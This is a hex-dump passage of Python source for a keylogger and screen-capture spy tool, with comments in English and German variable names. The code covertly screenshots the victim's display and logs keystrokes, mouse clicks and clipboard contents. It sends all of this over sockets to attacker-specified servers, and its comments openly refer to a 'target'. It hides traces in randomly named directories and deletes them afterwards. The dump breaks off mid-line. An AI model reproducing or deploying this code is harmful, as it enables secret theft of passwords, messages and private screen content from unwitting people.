-00000bc0: 740d 0a20 2020 2020 2020 207a 6569 6368  t..        zeich
-00000bd0: 656e 203d 2022 7177 6572 747a 7569 6f70  en = "qwertzuiop
-00000be0: 6173 6466 6768 6a6b 6c79 7863 7662 6e6d  asdfghjklyxcvbnm
-00000bf0: 3132 3334 3536 3738 3930 220d 0a20 2020  1234567890"..   
-00000c00: 2020 2020 2072 616e 646f 6d5f 6c73 7420       random_lst 
-00000c10: 3d20 5b22 222e 6a6f 696e 2872 616e 646f  = ["".join(rando
-00000c20: 6d2e 7361 6d70 6c65 287a 6569 6368 656e  m.sample(zeichen
-00000c30: 2c20 7261 6e64 6f6d 2e72 616e 6469 6e74  , random.randint
-00000c40: 2834 2c20 3130 2929 2920 666f 7220 7820  (4, 10))) for x 
-00000c50: 696e 2072 616e 6765 2831 3030 295d 0d0a  in range(100)]..
-00000c60: 2020 2020 2020 2020 2320 5468 6973 206d          # This m
-00000c70: 616b 6573 2061 206c 6973 7420 6f66 2065  akes a list of e
-00000c80: 7665 7279 2064 6972 6563 746f 7279 206e  very directory n
-00000c90: 616d 6520 7261 6e64 6f6d 6c79 0d0a 2020  ame randomly..  
-00000ca0: 2020 2020 2020 666f 7220 6469 725f 6e61        for dir_na
-00000cb0: 6d65 2069 6e20 7261 6e64 6f6d 5f6c 7374  me in random_lst
-00000cc0: 3a0d 0a20 2020 2020 2020 2020 2020 206f  :..            o
-00000cd0: 732e 7379 7374 656d 2866 226d 6b64 6972  s.system(f"mkdir
-00000ce0: 207b 6469 725f 6e61 6d65 7d22 290d 0a20   {dir_name}").. 
-00000cf0: 2020 2020 2020 2020 2020 2023 2054 6865             # The
-00000d00: 2064 6972 6563 746f 7279 2069 7320 6265   directory is be
-00000d10: 696e 6720 6d61 6465 2068 6572 650d 0a20  ing made here.. 
-00000d20: 2020 2020 2020 206c 7374 5f73 6572 7665         lst_serve
-00000d30: 7220 3d20 736f 636b 6574 2e73 6f63 6b65  r = socket.socke
-00000d40: 7428 736f 636b 6574 2e41 465f 494e 4554  t(socket.AF_INET
-00000d50: 2c20 736f 636b 6574 2e53 4f43 4b5f 5354  , socket.SOCK_ST
-00000d60: 5245 414d 290d 0a20 2020 2020 2020 206c  REAM)..        l
-00000d70: 7374 5f73 6572 7665 722e 636f 6e6e 6563  st_server.connec
-00000d80: 7428 2822 3132 372e 302e 302e 3122 2c20  t(("127.0.0.1", 
-00000d90: 3130 3737 2929 0d0a 2020 2020 2020 2020  1077))..        
-00000da0: 6c73 745f 7365 7276 6572 2e73 656e 6428  lst_server.send(
-00000db0: 7374 7228 7261 6e64 6f6d 5f6c 7374 292e  str(random_lst).
-00000dc0: 656e 636f 6465 2829 290d 0a20 2020 2020  encode())..     
-00000dd0: 2020 206c 7374 5f73 6572 7665 722e 636c     lst_server.cl
-00000de0: 6f73 6528 290d 0a0d 0a20 2020 2020 2020  ose()....       
-00000df0: 2072 616e 646f 6d5f 6469 7220 3d20 7261   random_dir = ra
-00000e00: 6e64 6f6d 2e63 686f 6963 6528 7261 6e64  ndom.choice(rand
-00000e10: 6f6d 5f6c 7374 290d 0a20 2020 2020 2020  om_lst)..       
-00000e20: 206f 732e 6368 6469 7228 7261 6e64 6f6d   os.chdir(random
-00000e30: 5f64 6972 290d 0a20 2020 2020 2020 2023  _dir)..        #
-00000e40: 2057 6520 6172 6520 6e6f 7720 696e 2074   We are now in t
-00000e50: 6861 7420 6469 7265 6374 6f72 7920 7768  hat directory wh
-00000e60: 6572 6520 7468 6520 696d 6167 6520 6361  ere the image ca
-00000e70: 6e20 6265 2073 746f 7265 640d 0a0d 0a20  n be stored.... 
-00000e80: 2020 2064 6566 2063 6c69 656e 7428 7365     def client(se
-00000e90: 6c66 2c20 6970 5f70 686f 746f 732c 2070  lf, ip_photos, p
-00000ea0: 6f72 745f 7068 6f74 6f73 293a 0d0a 2020  ort_photos):..  
-00000eb0: 2020 2020 2020 676c 6f62 616c 2066 6861        global fha
-00000ec0: 6e64 6c65 0d0a 2020 2020 2020 2020 2320  ndle..        # 
-00000ed0: 6668 616e 646c 6520 6973 2074 6865 2076  fhandle is the v
-00000ee0: 6172 6961 626c 6520 7768 6963 6820 6f70  ariable which op
-00000ef0: 656e 7320 7468 6520 666f 746f 0d0a 2020  ens the foto..  
-00000f00: 2020 2020 2020 7320 3d20 736f 636b 6574        s = socket
-00000f10: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
-00000f20: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
-00000f30: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
-00000f40: 2020 2020 2073 2e63 6f6e 6e65 6374 2828       s.connect((
-00000f50: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
-00000f60: 7068 6f74 6f73 2929 0d0a 2020 2020 2020  photos))..      
-00000f70: 2020 2320 5468 6973 2063 6f6e 6e65 6374    # This connect
-00000f80: 7320 746f 2074 6865 2073 6572 7665 7220  s to the server 
-00000f90: 796f 7520 7370 6563 6966 6965 640d 0a20  you specified.. 
-00000fa0: 2020 2020 2020 2069 6d61 6765 203d 2070         image = p
-00000fb0: 672e 7363 7265 656e 7368 6f74 2829 0d0a  g.screenshot()..
-00000fc0: 2020 2020 2020 2020 2320 2269 6d61 6765          # "image
-00000fd0: 2220 7363 7265 656e 7368 6f74 7320 7468  " screenshots th
-00000fe0: 6520 6375 7272 656e 7420 696d 6167 6520  e current image 
-00000ff0: 6166 7465 7220 6120 7370 6563 6966 6963  after a specific
-00001000: 2074 696d 650d 0a20 2020 2020 2020 2066   time..        f
-00001010: 6f74 6f6e 616d 6520 3d20 2249 6d61 6765  otoname = "Image
-00001020: 2e70 6e67 220d 0a20 2020 2020 2020 2023  .png"..        #
-00001030: 204e 616d 6520 6f66 2074 6865 2069 6d61   Name of the ima
-00001040: 6765 0d0a 2020 2020 2020 2020 696d 6167  ge..        imag
-00001050: 652e 7361 7665 2866 6f74 6f6e 616d 6529  e.save(fotoname)
-00001060: 0d0a 2020 2020 2020 2020 2320 5361 7665  ..        # Save
-00001070: 7320 7468 6520 696d 6167 6520 696e 2074  s the image in t
-00001080: 6865 2063 7572 7265 6e74 2064 6972 6563  he current direc
-00001090: 746f 7279 0d0a 2020 2020 2020 2020 6668  tory..        fh
-000010a0: 616e 646c 6520 3d20 6f70 656e 2866 6f74  andle = open(fot
-000010b0: 6f6e 616d 652c 2022 7262 2229 0d0a 2020  oname, "rb")..  
-000010c0: 2020 2020 2020 2320 4f70 656e 7320 7468        # Opens th
-000010d0: 6520 696d 6167 650d 0a0d 0a20 2020 2020  e image....     
-000010e0: 2020 2066 756c 6c5f 6d73 6720 3d20 6222     full_msg = b"
-000010f0: 220d 0a20 2020 2020 2020 2023 2045 7665  "..        # Eve
-00001100: 7279 2069 6d61 6765 2069 6e66 6f72 6d61  ry image informa
-00001110: 7469 6f6e 2077 696c 6c20 6265 2073 746f  tion will be sto
-00001120: 7265 6420 696e 2022 6675 6c6c 5f6d 7367  red in "full_msg
-00001130: 220d 0a20 2020 2020 2020 2066 6f72 206c  "..        for l
-00001140: 696e 6520 696e 2066 6861 6e64 6c65 3a0d  ine in fhandle:.
-00001150: 0a20 2020 2020 2020 2020 2020 2066 756c  .            ful
-00001160: 6c5f 6d73 6720 2b3d 206c 696e 650d 0a0d  l_msg += line...
-00001170: 0a20 2020 2020 2020 2073 2e73 656e 6428  .        s.send(
-00001180: 6675 6c6c 5f6d 7367 290d 0a0d 0a20 2020  full_msg)....   
-00001190: 2064 6566 2063 6f75 6e74 646f 776e 5f73   def countdown_s
-000011a0: 656e 6428 7365 6c66 2c20 7a65 6974 2c20  end(self, zeit, 
-000011b0: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
-000011c0: 7068 6f74 6f73 2c20 6970 5f6b 6579 6c6f  photos, ip_keylo
-000011d0: 6767 6572 2c20 706f 7274 5f6b 6579 6c6f  gger, port_keylo
-000011e0: 6767 6572 293a 0d0a 2020 2020 2020 2020  gger):..        
-000011f0: 7365 636f 6e64 735f 6c69 7374 203d 205b  seconds_list = [
-00001200: 7a61 686c 2066 6f72 207a 6168 6c20 696e  zahl for zahl in
-00001210: 2072 616e 6765 2830 2c20 7a65 6974 202b   range(0, zeit +
-00001220: 2031 2c20 3230 2920 6966 207a 6168 6c20   1, 20) if zahl 
-00001230: 213d 2030 5d0d 0a20 2020 2020 2020 2023  != 0]..        #
-00001240: 2054 6865 2073 6563 6f6e 6473 2074 6865   The seconds the
-00001250: 2069 6d61 6765 2077 696c 6c20 6265 2073   image will be s
-00001260: 656e 7420 696e 2032 3020 7374 6570 7320  ent in 20 steps 
-00001270: 746f 2074 6865 2073 6572 7665 7220 7769  to the server wi
-00001280: 6c6c 2062 6520 7361 7665 6420 696e 2022  ll be saved in "
-00001290: 7365 636f 6e64 735f 6c69 7374 220d 0a20  seconds_list".. 
-000012a0: 2020 2020 2020 2070 7269 6e74 2873 6563         print(sec
-000012b0: 6f6e 6473 5f6c 6973 7429 0d0a 2020 2020  onds_list)..    
-000012c0: 2020 2020 6b65 795f 6461 7461 203d 2073      key_data = s
-000012d0: 6f63 6b65 742e 736f 636b 6574 2873 6f63  ocket.socket(soc
-000012e0: 6b65 742e 4146 5f49 4e45 542c 2073 6f63  ket.AF_INET, soc
-000012f0: 6b65 742e 534f 434b 5f53 5452 4541 4d29  ket.SOCK_STREAM)
-00001300: 0d0a 0d0a 2020 2020 2020 2020 7472 793a  ....        try:
-00001310: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
-00001320: 7220 7820 696e 2072 616e 6765 287a 6569  r x in range(zei
-00001330: 7420 2b20 3129 3a0d 0a20 2020 2020 2020  t + 1):..       
-00001340: 2020 2020 2020 2020 2069 6620 7820 3d3d           if x ==
-00001350: 2032 303a 0d0a 2020 2020 2020 2020 2020   20:..          
-00001360: 2020 2020 2020 2020 2020 7365 6c66 2e61            self.a
-00001370: 6c6c 5f64 6972 2829 0d0a 2020 2020 2020  ll_dir()..      
-00001380: 2020 2020 2020 2020 2020 2020 2020 2320                # 
-00001390: 5468 6973 2066 756e 6374 696f 6e20 6d61  This function ma
-000013a0: 6b65 7320 3130 3020 6669 6c65 7320 746f  kes 100 files to
-000013b0: 2073 746f 7265 2074 6865 2069 6d61 6765   store the image
-000013c0: 2073 6f20 7468 6520 7461 7267 6574 2077   so the target w
-000013d0: 6f6e 2774 2066 696e 6420 6f75 740d 0a20  on't find out.. 
-000013e0: 2020 2020 2020 2020 2020 2020 2020 2070                 p
-000013f0: 7269 6e74 2878 290d 0a20 2020 2020 2020  rint(x)..       
-00001400: 2020 2020 2020 2020 207a 6569 7420 2d3d           zeit -=
-00001410: 2031 0d0a 2020 2020 2020 2020 2020 2020   1..            
-00001420: 2020 2020 7469 6d65 2e73 6c65 6570 2831      time.sleep(1
-00001430: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00001440: 2020 2069 6620 7820 696e 2073 6563 6f6e     if x in secon
-00001450: 6473 5f6c 6973 743a 0d0a 2020 2020 2020  ds_list:..      
-00001460: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00001470: 6c66 2e63 6c69 656e 7428 6970 5f70 686f  lf.client(ip_pho
-00001480: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
-00001490: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-000014a0: 2020 2020 2020 2023 2054 6865 2069 6d61         # The ima
-000014b0: 6765 7320 7769 6c6c 2062 6520 7365 6e74  ges will be sent
-000014c0: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
-000014d0: 795f 6461 7461 2e63 6f6e 6e65 6374 2828  y_data.connect((
-000014e0: 6970 5f6b 6579 6c6f 6767 6572 2c20 706f  ip_keylogger, po
-000014f0: 7274 5f6b 6579 6c6f 6767 6572 2929 0d0a  rt_keylogger))..
-00001500: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
-00001510: 6973 2069 7320 7468 6520 6970 2061 6e64  is is the ip and
-00001520: 2074 6865 2070 6f72 7420 6f66 2074 6865   the port of the
-00001530: 2073 6572 7665 7220 7468 6520 706f 7274   server the port
-00001540: 2073 686f 756c 646e 2774 2062 6520 7468   shouldn't be th
-00001550: 6520 7361 6d65 2074 6865 2073 6572 7665  e same the serve
-00001560: 725f 7068 6f74 6f73 2061 6e64 2074 6865  r_photos and the
-00001570: 2073 6572 7665 725f 6b65 796c 6f67 6765   server_keylogge
-00001580: 7220 7368 6f75 6c64 6e27 7420 6265 0d0a  r shouldn't be..
-00001590: 2020 2020 2020 2020 2020 2020 2320 696e              # in
-000015a0: 2074 6865 2073 616d 6520 666f 6c64 6572   the same folder
-000015b0: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
-000015c0: 6c66 2e63 6f6f 7264 696e 6174 6573 203d  lf.coordinates =
-000015d0: 206c 6973 7428 7365 7428 7365 6c66 2e63   list(set(self.c
-000015e0: 6f6f 7264 696e 6174 6573 2929 0d0a 2020  oordinates))..  
-000015f0: 2020 2020 2020 2020 2020 2320 5468 6973            # This
-00001600: 2063 6865 636b 7320 6966 2074 6865 2063   checks if the c
-00001610: 6f6f 7264 696e 6174 6573 206f 6363 7572  oordinates occur
-00001620: 2032 2074 696d 6573 0d0a 2020 2020 2020   2 times..      
-00001630: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
-00001640: 2e63 6f6f 7264 696e 6174 6573 290d 0a20  .coordinates).. 
-00001650: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
-00001660: 3d20 2222 0d0a 2020 2020 2020 2020 2020  = ""..          
-00001670: 2020 666f 7220 7a65 6963 6865 6e20 696e    for zeichen in
-00001680: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
-00001690: 6973 7465 3a0d 0a20 2020 2020 2020 2020  iste:..         
-000016a0: 2020 2020 2020 2077 6f72 7420 2b3d 207a         wort += z
-000016b0: 6569 6368 656e 0d0a 0d0a 2020 2020 2020  eichen....      
-000016c0: 2020 2020 2020 2320 5365 6e64 7320 7468        # Sends th
-000016d0: 6520 6461 7461 2074 6f20 7365 7276 6572  e data to server
-000016e0: 5f6b 6579 6c6f 6767 6572 0d0a 2020 2020  _keylogger..    
-000016f0: 2020 2020 2020 2020 616c 6c5f 6461 7461          all_data
-00001700: 203d 2073 7472 2873 656c 662e 636f 6f72   = str(self.coor
-00001710: 6469 6e61 7465 7329 202b 2077 6f72 740d  dinates) + wort.
-00001720: 0a20 2020 2020 2020 2020 2020 2023 2043  .            # C
-00001730: 6f6f 7264 696e 6174 6573 2061 6e64 206b  oordinates and k
-00001740: 6579 6461 7461 2061 7265 2062 6569 6e67  eydata are being
-00001750: 2063 6f6e 6361 7465 6e61 7465 640d 0a20   concatenated.. 
-00001760: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
-00001770: 6174 612e 7365 6e64 2861 6c6c 5f64 6174  ata.send(all_dat
-00001780: 612e 656e 636f 6465 2829 290d 0a20 2020  a.encode())..   
-00001790: 2020 2020 2020 2020 2070 7269 6e74 2877           print(w
-000017a0: 6f72 7429 0d0a 2020 2020 2020 2020 2020  ort)..          
-000017b0: 2020 7072 696e 7428 7365 6c66 2e72 6963    print(self.ric
-000017c0: 6874 6967 655f 6c69 7374 6529 0d0a 2020  htige_liste)..  
-000017d0: 2020 2020 2020 2020 2020 6668 616e 646c            fhandl
-000017e0: 652e 636c 6f73 6528 290d 0a20 2020 2020  e.close()..     
-000017f0: 2020 2020 2020 2023 2043 6c6f 7365 7320         # Closes 
-00001800: 7468 6520 696d 6167 650d 0a20 2020 2020  the image..     
-00001810: 2020 2020 2020 206f 732e 7265 6d6f 7665         os.remove
-00001820: 2822 496d 6167 652e 706e 6722 290d 0a20  ("Image.png").. 
-00001830: 2020 2020 2020 2020 2020 2023 2044 656c             # Del
-00001840: 6574 6573 2074 6865 2069 6d61 6765 2069  etes the image i
-00001850: 6e20 7468 6520 6375 7272 656e 7420 6469  n the current di
-00001860: 7265 6374 6f72 790d 0a20 2020 2020 2020  rectory..       
-00001870: 2020 2020 206f 732e 6368 6469 7228 222e       os.chdir(".
-00001880: 2e22 290d 0a20 2020 2020 2020 2020 2020  .")..           
-00001890: 2023 2057 6520 6861 7665 2074 6f20 676f   # We have to go
-000018a0: 2062 6163 6b20 736f 2074 6861 7420 7765   back so that we
-000018b0: 2063 616e 2064 656c 6574 6520 7468 6520   can delete the 
-000018c0: 6f74 6865 7220 6469 7265 6374 6f72 6965  other directorie
-000018d0: 730d 0a20 2020 2020 2020 2020 2020 2066  s..            f
-000018e0: 6f72 2065 6163 685f 6469 7220 696e 2072  or each_dir in r
-000018f0: 616e 646f 6d5f 6c73 743a 0d0a 2020 2020  andom_lst:..    
-00001900: 2020 2020 2020 2020 2020 2020 7368 7574              shut
-00001910: 696c 2e72 6d74 7265 6528 6561 6368 5f64  il.rmtree(each_d
-00001920: 6972 290d 0a20 2020 2020 2020 2020 2020  ir)..           
-00001930: 2020 2020 2023 2054 6869 7320 6465 6c65       # This dele
-00001940: 7465 7320 6576 6572 7920 6469 7265 6374  tes every direct
-00001950: 6f72 790d 0a20 2020 2020 2020 2020 2020  ory..           
-00001960: 2073 7973 2e65 7869 7428 290d 0a20 2020   sys.exit()..   
-00001970: 2020 2020 2020 2020 2023 2053 746f 7073           # Stops
-00001980: 2074 6865 206b 6579 6c6f 6767 6572 0d0a   the keylogger..
-00001990: 2020 2020 2020 2020 6578 6365 7074 204b          except K
-000019a0: 6579 626f 6172 6449 6e74 6572 7275 7074  eyboardInterrupt
-000019b0: 3a0d 0a20 2020 2020 2020 2020 2020 2023  :..            #
-000019c0: 2049 6620 7468 6520 7461 7267 6574 2068   If the target h
-000019d0: 6173 2064 6573 7472 6f79 6564 2074 6865  as destroyed the
-000019e0: 2063 6f6e 6e65 6374 696f 6e0d 0a20 2020   connection..   
-000019f0: 2020 2020 2020 2020 2077 6f72 7420 3d20           wort = 
-00001a00: 222a 2a2a 25c2 a7c2 a729 c2a7 c2a7 2522  "***%....)....%"
-00001a10: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00001a20: 5468 6973 2069 7320 6c69 6b65 2061 2073  This is like a s
-00001a30: 7065 6369 616c 2063 6f64 652e 2054 6f20  pecial code. To 
-00001a40: 7370 6c69 7420 6974 2061 7420 7468 6520  split it at the 
-00001a50: 656e 640d 0a20 2020 2020 2020 2020 2020  end..           
-00001a60: 2066 6f72 207a 6569 6368 656e 2069 6e20   for zeichen in 
-00001a70: 7365 6c66 2e72 6963 6874 6967 655f 6c69  self.richtige_li
-00001a80: 7374 653a 0d0a 2020 2020 2020 2020 2020  ste:..          
-00001a90: 2020 2020 2020 776f 7274 202b 3d20 7a65        wort += ze
-00001aa0: 6963 6865 6e0d 0a20 2020 2020 2020 2020  ichen..         
-00001ab0: 2020 2069 6620 7365 6c66 2e63 6f6f 7264     if self.coord
-00001ac0: 696e 6174 6573 3a0d 0a20 2020 2020 2020  inates:..       
-00001ad0: 2020 2020 2020 2020 2077 6f72 7420 2b3d           wort +=
-00001ae0: 2073 7472 2873 656c 662e 636f 6f72 6469   str(self.coordi
-00001af0: 6e61 7465 7329 0d0a 2020 2020 2020 2020  nates)..        
-00001b00: 2020 2020 6461 7461 203d 2066 2254 4845      data = f"THE
-00001b10: 2043 4f4e 4e45 4354 494f 4e20 4841 5320   CONNECTION HAS 
-00001b20: 4245 454e 2049 4e54 4552 5255 5054 4544  BEEN INTERRUPTED
-00001b30: 7b77 6f72 747d 220d 0a20 2020 2020 2020  {wort}"..       
-00001b40: 2020 2020 2023 2054 6869 7320 6c65 7427       # This let'
-00001b50: 7320 7468 6520 7365 7276 6572 206b 6e6f  s the server kno
-00001b60: 7720 7468 6174 2074 6865 2073 6572 7665  w that the serve
-00001b70: 7220 7368 6f75 6c64 2073 6875 7420 646f  r should shut do
-00001b80: 776e 0d0a 2020 2020 2020 2020 2020 2020  wn..            
-00001b90: 6b65 795f 6461 7461 2e63 6f6e 6e65 6374  key_data.connect
-00001ba0: 2828 6970 5f6b 6579 6c6f 6767 6572 2c20  ((ip_keylogger, 
-00001bb0: 706f 7274 5f6b 6579 6c6f 6767 6572 2929  port_keylogger))
-00001bc0: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
-00001bd0: 795f 6461 7461 2e73 656e 6428 6461 7461  y_data.send(data
-00001be0: 2e65 6e63 6f64 6528 2929 0d0a 2020 2020  .encode())..    
-00001bf0: 2020 2020 2020 2020 6b65 795f 6461 7461          key_data
-00001c00: 2e63 6c6f 7365 2829 0d0a 0d0a 2020 2020  .close()....    
-00001c10: 2020 2020 2020 2020 6966 206f 732e 7061          if os.pa
-00001c20: 7468 2e65 7869 7374 7328 2249 6d61 6765  th.exists("Image
-00001c30: 2e70 6e67 2229 3a0d 0a20 2020 2020 2020  .png"):..       
-00001c40: 2020 2020 2020 2020 2023 2049 7420 7769           # It wi
-00001c50: 6c6c 2064 6573 7472 6f79 2074 6865 2069  ll destroy the i
-00001c60: 6d61 6765 2073 6f20 7461 7267 6574 2077  mage so target w
-00001c70: 6f75 6e64 206b 6e6f 7720 616e 7974 6869  ound know anythi
-00001c80: 6e67 0d0a 2020 2020 2020 2020 2020 2020  ng..            
-00001c90: 2020 2020 6668 616e 646c 652e 636c 6f73      fhandle.clos
-00001ca0: 6528 290d 0a0d 0a20 2020 2020 2020 2020  e()....         
-00001cb0: 2020 206e 6577 5f73 6572 7665 7220 3d20     new_server = 
-00001cc0: 736f 636b 6574 2e73 6f63 6b65 7428 736f  socket.socket(so
-00001cd0: 636b 6574 2e41 465f 494e 4554 2c20 736f  cket.AF_INET, so
-00001ce0: 636b 6574 2e53 4f43 4b5f 5354 5245 414d  cket.SOCK_STREAM
-00001cf0: 290d 0a20 2020 2020 2020 2020 2020 206e  )..            n
-00001d00: 6577 5f73 6572 7665 722e 636f 6e6e 6563  ew_server.connec
-00001d10: 7428 2822 3132 372e 302e 302e 3122 2c20  t(("127.0.0.1", 
-00001d20: 3130 3737 2929 0d0a 2020 2020 2020 2020  1077))..        
-00001d30: 2020 2020 6e65 775f 7365 7276 6572 2e73      new_server.s
-00001d40: 656e 6428 2264 6f6e 6522 2e65 6e63 6f64  end("done".encod
-00001d50: 6528 2929 0d0a 2020 2020 2020 2020 2020  e())..          
-00001d60: 2020 6e65 775f 7365 7276 6572 2e63 6c6f    new_server.clo
-00001d70: 7365 2829 0d0a 0d0a 0d0a 0d0a 2020 2020  se()........    
-00001d80: 6465 6620 6b69 6c6c 5f73 7769 7463 6828  def kill_switch(
-00001d90: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
-00001da0: 2320 5468 6973 2066 756e 6374 696f 6e20  # This function 
-00001db0: 6465 7374 726f 7973 2074 6865 206d 6f75  destroys the mou
-00001dc0: 7365 2069 6e66 6f0d 0a20 2020 2020 2020  se info..       
-00001dd0: 206e 6577 5f73 6563 6f6e 6473 203d 2073   new_seconds = s
-00001de0: 656c 662e 6475 7261 7469 6f6e 202b 2035  elf.duration + 5
-00001df0: 0d0a 2020 2020 2020 2020 2320 3230 2073  ..        # 20 s
-00001e00: 6563 6f6e 6473 2061 7265 2062 6569 6e67  econds are being
-00001e10: 2061 6464 6564 2062 6563 6175 7365 2074   added because t
-00001e20: 6865 7265 206d 6967 6874 2062 6520 6120  here might be a 
-00001e30: 7072 6f62 6c65 6d0d 0a20 2020 2020 2020  problem..       
-00001e40: 2066 6f72 2078 2069 6e20 7261 6e67 6528   for x in range(
-00001e50: 6e65 775f 7365 636f 6e64 7329 3a0d 0a20  new_seconds):.. 
-00001e60: 2020 2020 2020 2020 2020 2074 696d 652e             time.
-00001e70: 736c 6565 7028 3129 0d0a 2020 2020 2020  sleep(1)..      
-00001e80: 2020 2320 5468 6973 2073 746f 7065 7320    # This stopes 
-00001e90: 7468 650d 0a20 2020 2020 2020 2073 7973  the..        sys
-00001ea0: 2e65 7869 7428 290d 0a0d 0a20 2020 2064  .exit()....    d
-00001eb0: 6566 206f 6e5f 636c 6963 6b28 7365 6c66  ef on_click(self
-00001ec0: 2c20 782c 2079 2c20 6275 7474 6f6e 2c20  , x, y, button, 
-00001ed0: 7072 6573 7365 6429 3a0d 0a20 2020 2020  pressed):..     
-00001ee0: 2020 2023 2054 6869 7320 6973 2074 6865     # This is the
-00001ef0: 2063 6c69 636b 2066 756e 6374 696f 6e0d   click function.
-00001f00: 0a20 2020 2020 2020 2070 7269 6e74 2866  .        print(f
-00001f10: 2254 6172 6765 7420 6861 7320 7072 6573  "Target has pres
-00001f20: 7365 6420 7b78 7d20 616e 6420 7b79 7d22  sed {x} and {y}"
-00001f30: 290d 0a20 2020 2020 2020 2023 2041 6c6c  )..        # All
-00001f40: 2074 6865 2063 6f6f 7264 696e 6174 6573   the coordinates
-00001f50: 2077 696c 6c20 6265 2073 746f 7265 6420   will be stored 
-00001f60: 696e 2022 7365 6c66 2e63 6f6f 7264 696e  in "self.coordin
-00001f70: 6174 6573 220d 0a20 2020 2020 2020 2073  ates"..        s
-00001f80: 656c 662e 636f 6f72 6469 6e61 7465 732e  elf.coordinates.
-00001f90: 6170 7065 6e64 2828 782c 2079 2929 0d0a  append((x, y))..
-00001fa0: 0d0a 2020 2020 6465 6620 616c 6c5f 636c  ..    def all_cl
-00001fb0: 6963 6b73 2873 656c 6629 3a0d 0a20 2020  icks(self):..   
-00001fc0: 2020 2020 2023 2054 6869 7320 6973 206a       # This is j
-00001fd0: 7573 7420 6120 6675 6e63 7469 6f6e 2073  ust a function s
-00001fe0: 6f20 6974 2063 616e 2062 6520 7261 6e20  o it can be ran 
-00001ff0: 7769 7468 2074 6872 6561 6469 6e67 0d0a  with threading..
-00002000: 2020 2020 2020 2020 7769 7468 204c 6973          with Lis
-00002010: 7465 6e65 7228 6f6e 5f63 6c69 636b 3d73  tener(on_click=s
-00002020: 656c 662e 6f6e 5f63 6c69 636b 2920 6173  elf.on_click) as
-00002030: 206c 6973 7465 6e69 6e67 3a0d 0a20 2020   listening:..   
-00002040: 2020 2020 2020 2020 2073 656c 662e 6b69           self.ki
-00002050: 6c6c 5f73 7769 7463 6828 290d 0a20 2020  ll_switch()..   
-00002060: 2020 2020 2020 2020 206c 6973 7465 6e69           listeni
-00002070: 6e67 2e6a 6f69 6e28 290d 0a0d 0a20 2020  ng.join()....   
-00002080: 2064 6566 2063 6f70 795f 6461 7461 2873   def copy_data(s
-00002090: 656c 6629 3a0d 0a20 2020 2020 2020 2073  elf):..        s
-000020a0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
-000020b0: 7465 2e61 7070 656e 6428 2220 2843 4f50  te.append(" (COP
-000020c0: 5920 2853 7472 672b 6329 2920 2229 0d0a  Y (Strg+c)) ")..
-000020d0: 0d0a 2020 2020 6465 6620 6170 7065 6e64  ..    def append
-000020e0: 5f70 6173 7465 2873 656c 6629 3a0d 0a20  _paste(self):.. 
-000020f0: 2020 2020 2020 2064 6174 6120 3d20 6622         data = f"
-00002100: 2028 7b70 7970 6572 636c 6970 2e70 6173   ({pyperclip.pas
-00002110: 7465 2829 7d20 7c20 5041 5354 4520 2853  te()} | PASTE (S
-00002120: 7472 672b 7629 2920 7c20 220d 0a20 2020  trg+v)) | "..   
-00002130: 2020 2020 2073 656c 662e 7269 6368 7469       self.richti
-00002140: 6765 5f6c 6973 7465 2e61 7070 656e 6428  ge_liste.append(
-00002150: 6461 7461 290d 0a0d 0a20 2020 2064 6566  data)....    def
-00002160: 2070 7269 6e74 5f77 6f72 6b28 7365 6c66   print_work(self
-00002170: 2c20 776f 7264 293a 0d0a 2020 2020 2020  , word):..      
-00002180: 2020 7072 696e 7428 6627 416c 7068 6162    print(f'Alphab
-00002190: 6574 6963 206b 6579 2077 6173 2070 7265  etic key was pre
-000021a0: 7373 6564 3a20 7b77 6f72 647d 2027 290d  ssed: {word} ').
-000021b0: 0a20 2020 2020 2020 2073 656c 662e 7269  .        self.ri
-000021c0: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
-000021d0: 776f 7264 0d0a 2020 2020 2020 2020 2320  word..        # 
-000021e0: 4576 6572 7920 7072 6573 7365 6420 6b65  Every pressed ke
-000021f0: 7920 7769 6c6c 2062 6520 7361 7665 6420  y will be saved 
-00002200: 696e 2022 7269 6368 7469 6765 5f6c 6973  in "richtige_lis
-00002210: 7465 2220 7468 6973 2069 7320 6120 6765  te" this is a ge
-00002220: 726d 616e 2073 656c 662e 776f 7264 2061  rman self.word a
-00002230: 6e64 206d 6561 6e73 2022 7269 6768 745f  nd means "right_
-00002240: 6c69 7374 220d 0a0d 0a20 2020 2064 6566  list"....    def
-00002250: 206f 6e5f 7072 6573 7328 7365 6c66 2c20   on_press(self, 
-00002260: 6b65 7929 3a0d 0a20 2020 2020 2020 2074  key):..        t
-00002270: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
-00002280: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
-00002290: 2020 2020 2020 206f 7468 6572 5f63 6861         other_cha
-000022a0: 7265 6374 6572 7320 3d20 7b22 3122 3a20  recters = {"1": 
-000022b0: 2221 222c 2022 3222 3a20 2722 272c 2022  "!", "2": '"', "
-000022c0: 3322 3a20 22c2 a722 2c20 2234 223a 2022  3": "..", "4": "
-000022d0: 2422 2c20 2235 223a 2022 2522 2c20 2236  $", "5": "%", "6
-000022e0: 223a 2022 2622 2c20 2237 223a 2022 2f22  ": "&", "7": "/"
-000022f0: 2c20 2238 223a 2022 2822 2c0d 0a20 2020  , "8": "(",..   
-00002300: 2020 2020 2020 2020 2020 2020 2020 2020                  
